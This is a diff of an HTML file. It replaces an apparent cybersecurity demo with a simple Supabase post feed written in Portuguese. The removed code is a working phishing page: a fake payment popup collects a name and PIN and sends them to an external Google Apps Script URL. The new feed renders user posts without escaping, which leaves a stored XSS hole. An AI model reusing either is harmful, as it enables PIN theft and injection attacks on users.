@@ -1,86 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
-    <title>Projeto Cibersegurança - Final Real</title>
-    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
-    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nosso Canto ✨</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Estilo que será aplicado quando o form for criado */
-        .hacker-popup {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(15, 15, 15, 0.98); padding: 25px; border-radius: 15px;
-            z-index: 9999; text-align: center; color: white; 
-            font-family: sans-serif; border: 2px solid #e74c3c; 
-            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5); width: 85%; max-width: 300px;
-        }
-        .hacker-popup input { padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 16px; }
-        .hacker-popup button { padding: 12px 25px; background: #e74c3c; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        body { background: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; }
+        .post-card { background: #1e293b; border: 1px solid #334155; transition: 0.3s; }
+        .post-card:hover { transform: translateY(-5px); border-color: #38bdf8; }
     </style>
 </head>
+<body class="p-4 md:p-8">
 
-<body style="margin: 0px; overflow: hidden;">
+    <div class="max-w-4xl mx-auto">
+        <header class="flex justify-between items-center mb-10">
+            <h1 class="text-3xl font-bold text-sky-400">✨ Nosso Canto</h1>
+            <div id="user-info" class="text-sm text-slate-400"></div>
+        </header>
 
-    <div id="container-do-golpe"></div>
+        <div class="bg-slate-800 p-6 rounded-xl mb-8 shadow-xl">
+            <textarea id="texto-post" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-500" placeholder="O que está rolando?"></textarea>
+            <div class="flex justify-between mt-3">
+                <input id="nome-autor" type="text" placeholder="Seu nome" class="bg-slate-900 border border-slate-700 rounded px-3 py-1 text-sm">
+                <button onclick="enviarPost()" class="bg-sky-600 hover:bg-sky-500 px-6 py-2 rounded-lg font-bold transition">Postar</button>
+            </div>
+        </div>
 
-    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
-        <a-assets><img id="btnBanco" src="botao_banco2.png"></a-assets>
-        <a-entity cursor="rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>
-
-        <a-marker type="pattern" url="marker.patt">
-            <a-image class="clickable" src="#btnBanco" position="0 0.1 0" rotation="-90 0 0" width="2.5" height="3.0" onclick="criarFormulario()"></a-image>
-            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" width="2.6" height="3.1" material="opacity: 0.1; color: red" onclick="criarFormulario()"></a-plane>
-        </a-marker>
-
-        <a-entity camera></a-entity>
-    </a-scene>
+        <div id="feed" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <p class="text-slate-500">Carregando momentos...</p>
+        </div>
+    </div>
 
     <script>
-        const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
+        // CONFIGURAÇÃO DO SUPABASE (Substitua pelos seus dados)
+        const SUPABASE_URL = 'SUA_URL_AQUI';
+        const SUPABASE_KEY = 'SUA_ANON_KEY_AQUI';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        function criarFormulario() {
-            const container = document.getElementById('container-do-golpe');
-            
-            // Se já existir um form, não cria outro
-            if (container.innerHTML !== "") return;
+        // Função para buscar posts
+        async function carregarPosts() {
+            const { data, error } = await supabase
+                .from('posts')
+                .select('*')
+                .order('created_at', { ascending: false });
 
-            // Criamos o HTML do zero agora no clique
-            container.innerHTML = `
-                <div class="hacker-popup" id="meu-form">
-                    <h2 style="color: #e74c3c; margin: 0 0 10px 0;">PAGAMENTO</h2>
-                    <p style="font-size: 14px;">Identifique-se para continuar:</p>
-                    <input type="text" id="nome-input" placeholder="Seu Nome">
-                    <input type="password" id="pin-input" placeholder="Digite seu PIN" inputmode="numeric">
-                    <button id="btn-enviar" onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
-                    <p style="color: #888; font-size: 11px; margin-top: 10px;">🔒 Conexão Segura SSL</p>
-                </div>
-            `;
-        }
+            if (error) return console.error(error);
 
-        function enviarDados() {
-            const nome = document.getElementById('nome-input').value;
-            const pin = document.getElementById('pin-input').value;
+            const feed = document.getElementById('feed');
+            feed.innerHTML = '';
 
-            if (!nome || !pin) { alert("Preencha tudo!"); return; }
-
-            const btn = document.getElementById('btn-enviar');
-            btn.innerHTML = "PROCESSANDO...";
-            btn.disabled = true;
-
-            fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
-                method: 'POST',
-                mode: 'no-cors'
-            })
-            .then(() => {
-                alert("🚨 OPERAÇÃO CONCLUÍDA!");
-                // Remove o formulário do HTML para ele sumir de vez
-                document.getElementById('container-do-golpe').innerHTML = "";
-            })
-            .catch(() => {
-                alert("Erro ao enviar.");
-                btn.innerHTML = "CONFIRMAR PAGAMENTO";
-                btn.disabled = false;
+            data.forEach(post => {
+                feed.innerHTML += `
+                    <div class="post-card p-5 rounded-xl shadow-lg">
+                        <div class="flex justify-between mb-2">
+                            <span class="text-sky-400 font-bold">@${post.autor}</span>
+                            <span class="text-xs text-slate-500">${new Date(post.created_at).toLocaleDateString()}</span>
+                        </div>
+                        <p class="text-slate-200 leading-relaxed">${post.conteudo}</p>
+                        <div class="mt-4 flex items-center gap-2">
+                            <button onclick="curtir(${post.id}, ${post.curtidas})" class="hover:text-pink-500 transition">❤️ ${post.curtidas}</button>
+                        </div>
+                    </div>
+                `;
             });
         }
+
+        // Função para postar
+        async function enviarPost() {
+            const conteudo = document.getElementById('texto-post').value;
+            const autor = document.getElementById('nome-autor').value || 'Anônimo';
+
+            if (!conteudo) return alert("Escreva algo!");
+
+            const { error } = await supabase
+                .from('posts')
+                .insert([{ autor, conteudo }]);
+
+            if (!error) {
+                document.getElementById('texto-post').value = '';
+                carregarPosts();
+            }
+        }
+
+        // Função para curtir
+        async function curtir(id, curtidasAtuais) {
+            await supabase
+                .from('posts')
+                .update({ curtidas: curtidasAtuais + 1 })
+                .eq('id', id);
+            carregarPosts();
+        }
+
+        // Atualiza o feed ao abrir e a cada 10 segundos
+        carregarPosts();
+        setInterval(carregarPosts, 10000);
     </script>
 </body>
 </html>
